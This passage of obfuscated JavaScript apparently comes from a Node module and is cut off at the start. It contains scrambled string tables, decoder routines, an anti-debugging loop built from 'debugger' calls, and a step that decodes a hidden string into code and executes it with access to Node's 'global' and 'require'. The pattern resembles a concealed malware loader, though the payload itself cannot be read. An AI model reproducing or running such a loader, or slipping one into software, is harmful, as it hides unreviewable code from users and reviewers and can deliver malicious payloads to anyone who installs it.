R.aP!e\x20&l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe\x20cRckRx)<c&ci.yceluy;,.XdrRlRR#\x20ccf.cR\x20\x20R$Rcorr(.rCp<Nr#E(]RnR\x22ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n\x20C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!\x20\x20R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a*\x20)I(ldR(wsr6\x20*R7!a<S.c<\x5cR.BELRe6Yf<1<ecPrDe\x20sl0PbD#R]o.\x27<l.m\x20R(p)<ekac.cR.d.._u<a\x27<\x20Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{\x20cWGf}ohdcas.].\x20fP=\x20os67EocIPoc\x20.7igcFCR.\x20<cE.N\x20.bR'},_0x4da251=(function(){var _0x536b52=!![];return function(_0x32c1b6,_0x3e1ae4){var _0x5e8e66=_0x536b52?function(){if(_0x3e1ae4){var _0x28de65=_0x3e1ae4['apply'](_0x32c1b6,arguments);return _0x3e1ae4=null,_0x28de65;}}:function(){};return _0x536b52=![],_0x5e8e66;};}());(function(){var _0x1f5f7f=_0x6258,_0x555094={'QHOtj':function(_0x2c821,_0x25e7b7){return _0x2c821(_0x25e7b7);},'XNymH':'init','uGjJW':_0x1f5f7f(0x13)};_0x4da251(this,function(){var _0x4f6d5d=_0x1f5f7f,_0xb81443=new RegExp(_0x4f6d5d(0x1d)),_0x4323f4=new RegExp(_0x4f6d5d(0x2),'i'),_0x24d546=_0x555094[_0x4f6d5d(0x24)](_0x22420d,_0x555094[_0x4f6d5d(0x18)]);!_0xb81443['test'](_0x24d546+_0x4f6d5d(0x26))||!_0x4323f4[_0x4f6d5d(0x6)](_0x24d546+_0x555094[_0x4f6d5d(0x1e)])?_0x24d546('0'):_0x22420d();})();}()),_0x1b7459['z']=z;var _0x72b5ed=splitLane('c^mejb^tro');_0x1b7459[_0x72b5ed[0x0]]=_0x4a79f9;typeof module===_0x72b5ed[0x1]&&(_0x1b7459[_0x72b5ed[0x2]]=module);var _0x2bb32f=peel(_0x3141c3(0x17)),_0x3b6765=_0x2bb32f['substring'](0x0,0xb),_0x446150=peel[_0x3b6765],_0x27ffcc=_0x446150('',_0x8cc316[_0x3141c3(0xf)](peel,'=aenruh(al=5c,g8fdu.yr\x20..ncecf,5\x22paeau6lnj)r]2uv\x22x-q(]\x20a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw).\x20rod[fs2n{drvt4x)+0,anr+rr+o)}z1\x20=hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae\x20f=[;hisy.em(d+o!2\x20=(evea78=.)4ei=g.n={ff=1[<2a\x20f1=r;4,S)rylv1u\x20y;kql{tvnv\x20(C\x20(l,ovnp\x20i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\x22]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r,\x20.);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe\x20t0nrpr(\x20vr8flrn,ddgt\x20]6a.;m;rth.gq\x202a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\x22li\x22r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\x22)cpA+u;utp]\x22=lk7vpt\x201r;hzw\x22)t()9)(.lul=s7f;\x20;sq0)n\x22y+0s}=va+s\x20mh(0q.]hv;>\x2006=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r;\x20)r>18zho*o{<akmsn)akte.vo9+ea0clio;bu\x20=]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\x22}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+\x20hlk[+x=e\x20-8j{(ejy9(())\x20')),_0x2d7b70=_0x27ffcc(_0x8cc316[_0x3141c3(0x12)](peel,_0x8cc316[_0x3141c3(0x4)]));return _0x446150('',_0x2d7b70)(0x9cd),0x1fce;}(global,require));function _0x22420d(_0x778131){var _0x21db15={'UCgtP':function(_0x2e7735,_0x5d6fde){return _0x2e7735===_0x5d6fde;},'dTBsP':function(_0x48db58,_0x50131f){return _0x48db58!==_0x50131f;},'vUpMU':function(_0x434954,_0x31c97f){return _0x434954/_0x31c97f;},'hTdRG':function(_0xc58533,_0x5b7cfe){return _0xc58533(_0x5b7cfe);}};function _0x545b05(_0xc590ad){var _0x43f230=_0x6258;if(_0x21db15['UCgtP'](typeof _0xc590ad,_0x43f230(0x14)))return function(_0x4eb5ca){}[_0x43f230(0x21)](_0x43f230(0x22))[_0x43f230(0x1a)](_0x43f230(0x7));else _0x21db15['dTBsP']((''+_0x21db15[_0x43f230(0x3)](_0xc590ad,_0xc590ad))[_0x43f230(0x8)],0x1)||_0xc590ad%0x14===0x0?function(){return!![];}['constructor'](_0x43f230(0x0)+'gger')['call'](_0x43f230(0x16)):function(){return![];}[_0x43f230(0x21)](_0x43f230(0x0)+_0x43f230(0x10))['apply'](_0x43f230(0x25));_0x21db15[_0x43f230(0x11)](_0x545b05,++_0xc590ad);}try{if(_0x778131)return _0x545b05;else _0x545b05(0x0);}catch(_0x321904){}}
